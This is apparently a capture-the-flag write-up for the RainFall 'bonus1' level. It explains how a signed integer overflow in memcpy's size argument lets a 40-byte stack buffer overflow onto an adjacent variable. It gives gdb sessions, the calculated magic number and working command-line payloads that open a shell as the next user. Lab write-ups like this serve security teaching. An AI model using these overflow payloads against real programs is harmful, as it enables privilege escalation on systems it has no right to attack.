<h1 align="center"> BONUS 1 </h1>

## 🔍 Analysis of Decompiled [bonus1](./source.c) 

This is a classic integer overflow vulnerability that leads to a buffer overflow. The program takes two command-line arguments:
- a number and a string, then uses the number to control how much data is copied from the string into a fixed-size buffer.


The vulnerability stems from multiple issues:

- Integer Multiplication: `num * 4` can overflow
- Signed vs Unsigned: memcpy expects size_t (unsigned), but num is signed
- The num variable is stored adjacent to `buffer[40]`

Memory Layout

```bash
(gdb) disas main
# Key instructions:
0x0804842a: sub    $0x40,%esp         ; reserves 64 bytes stack space
0x0804843d: mov    %eax,0x3c(%esp)    ; num is stored at [esp+0x3c].
0x08048464: lea    0x14(%esp),%eax    ; buffer starts at [esp+0x14]→ buffer[0]:[esp+0x3b]→ buffer[39].
0x08048468: mov    %ecx,0x8(%esp)     ; size = num * 4  (ecx * 4 stored at esp+8)
0x08048470: mov    %edx,0x4(%esp)     ; source = argv[2]
0x08048473: call   memcpy@plt         ; memcpy(dest, src, size)
0x08048478: <next instr>              ; after memcpy
0x08048478+: cmpl  $0x574f4c46,0x3c(%esp) ; compare num with 0x574F4C46

```
- buffer → `esp+0x14` (40 bytes)
- num → `esp+0x3c` (4 bytes)
- The `num < 10` check is a signed comparison, so negative num values pass the check.
- The size argument to memcpy is treated as size_t (unsigned). When you pass a signed int, it gets reinterpreted as an unsigned 32-bit value,so if we exceed the limit of the unsigned_int max we will back to 0.

## 💥 Exploit
copy 44 bytes so you overwrite 40 bytes of buffer plus the 4 bytes of num that sit immediately after it.

### Step 1: Understanding the Integer Overflow
The constraint `num < 10` seems to prevent large copies, but we can exploit integer overflow:

- memcpy expects size_t (unsigned 32-bit)
- Maximum unsigned int: `4,294,967,295`
- When we provide negative numbers, they're cast to large positive values

### Step 2: Calculating the Magic Number
Target: Copy 44 bytes (40 for buffer + 4 to overwrite num).</br>
To bypass the < 10 check while getting a useful size:
- Maximum unsigned int = `4,294,967,295`.
- `4,294,967,295` / 4 + 1 = `1,073,741,824`.
- memcpy's third arg = num * 4 (32-bit arithmetic modulo 2^32).
- (num * 4) mod 2^32 = 44 (44 decimal = 0x2C).
- 44 ÷ 4 = 11.
- num = 11 - 2^30 = 11 - 1073741824 = `-1073741813`.
- in 32-bit two’s complement `-1073741813` is `0xC000000B`.
- multiply `0xC000000B` * 4 = `0x0000002C` which is 44.
- so the magic number is = `-1,073,741,813`
### Step 3: GDB Verification
Let's verify our calculations:
```bash
(gdb) b *0x08048473  # At memcpy call
(gdb) r -1073741824 AAAAAAAAAAAA
Starting program: /home/user/bonus1/bonus1 -1073741824 AAAAAAAAAAAA

Breakpoint 1, 0x08048473 in main ()
(gdb) x/x $esp+0x8
0xbffff278:	0x00000000 #So now we have 0 as a value. 

(gdb) run -1073741813 $(python -c "print 'B'*40 + 'FLOW'")
(gdb) x/x $esp+0x8
0xbffff278: 0x0000002c  # 44 in decimal

(gdb) b *0x08048478  # After memcpy
(gdb) continue
(gdb) x/wx $esp+0x3c
0xbffff25c: 0x574f4c46  # "FLOW" in little-endian!
```
```sh
(gdb) b *0x08048478
Breakpoint 1 at 0x08048478
(gdb) run -1073741813 $(python -c "print 'B'*40 + 'FLOW'")
(gdb) p/x $esp ==> $1 = 0xbffff6b0
(gdb) x/48bx $esp+0x14
(gdb) x/wx $esp+0x3c
(gdb) p/x $esp+0x14       # buffer start
(gdb) p/x $esp+0x3c       # nb location
```
## Payload
```sh
bashbonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "B"*40 + "FLOW"')
$ whoami
bonus2
```
### alternatively

```bash
bonus1@RainFall:~$ ./bonus1 -1073741809 $(python -c 'print "A"*56 + "\x82\x84\x04\x08"')
$ exit
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
$ exit
bonus1@RainFall:~$ ./bonus1 -2147483637 `python -c "print 'a' * 40 + '\x46''\x4c''\x4f''\x57'"`
$ exit
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "B"*40 + "FLOW"')
$ exit
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "B"*40 + "FLOW"')
$ exit
```



